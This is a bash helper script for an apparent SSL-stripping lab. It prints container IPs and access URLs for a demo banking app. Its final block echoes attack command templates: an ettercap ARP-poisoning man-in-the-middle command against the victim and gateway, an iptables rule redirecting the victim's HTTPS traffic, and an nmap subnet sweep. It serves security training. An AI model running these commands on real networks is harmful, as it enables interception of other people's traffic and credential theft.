#!/bin/bash

echo ""
echo "🎯 SSL STRIPPING LAB - CONTAINER IPS:"
echo "=================================="

# Wait for containers to be fully running
echo "⏳ Waiting for containers to initialize..."
sleep 15

# Get host IP for server access
HOST_IP=$(ip route get 1 | awk '{print $7}' | head -1)

# Get victim IP (macvlan network)
VICTIM_IP=$(docker inspect ssl_victim 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null || echo 'Not running')

echo "📱 BlueLedger Server: $HOST_IP (bridge network, port forwarded)"
echo "🎭 SSL Victim: $VICTIM_IP (macvlan network, real DHCP IP)"
echo ""

# Show access URLs
echo "🌐 Access URLs:"
echo "   Frontend:  http://$HOST_IP:3000"
echo "   HTTP API:  http://$HOST_IP:5000"
echo "   HTTPS API: https://$HOST_IP:5001"
echo ""

echo "🔓 Ready for SSL Stripping Attack!"
echo "Use these IPs in your ettercap and iptables commands."
echo "=================================="
echo ""

# Show quick ettercap command template
if [ "$VICTIM_IP" != "Not running" ] && [ "$VICTIM_IP" != "null" ]; then
    GATEWAY=$(ip route | grep default | head -1 | awk '{print $3}')
    echo "💡 Quick SSL Stripping Commands:"
    echo "   ettercap: sudo ettercap -T -M arp:remote /$VICTIM_IP// /$GATEWAY//"
    echo "   iptables: sudo iptables -t nat -A PREROUTING -s $VICTIM_IP -p tcp --dport 5001 -j REDIRECT --to-port 8080"
    echo ""
    echo "🔍 External nmap scan:"
    echo "   From another device: nmap -sn $GATEWAY/24"
    echo "   Look for victim IP: $VICTIM_IP"
fi